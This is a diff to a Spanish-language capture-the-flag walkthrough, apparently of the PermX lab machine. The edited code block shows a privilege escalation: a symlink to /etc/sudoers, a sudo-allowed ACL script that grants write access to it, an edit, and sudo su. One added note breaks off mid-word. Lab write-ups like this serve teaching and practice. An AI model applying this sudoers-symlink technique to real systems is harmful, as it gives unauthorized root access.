@@ -88,11 +88,16 @@ tenemos permisos de super usuario para el script `/opt/acl.sh` este archivo pued
 ### Explotación del script /opt/acl.sh
 
 ```python
-mtz@permx:~$ ln -s /etc/sudoers /home/mtz/sudoers
-mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/sudoers
-mtz@permx:~$ nano sudoers 
-mtz@permx:~$ sudo su
-[sudo] password for mtz: 
+mtz@permx:~$ > ln -s /etc/sudoers /home/mtz/sudoers
+
+mtz@permx:~$ > sudo /opt/acl.sh mtz rwx /home/mtz/sudoers
+
+mtz@permx:~$ > nano sudoers 
+
+Nota: aqui abrimos el enlace simbolico que hemos c
+
+mtz@permx:~$ > sudo su
+ 
 ```
 
 ![[Pasted image 20240712162102.png]]
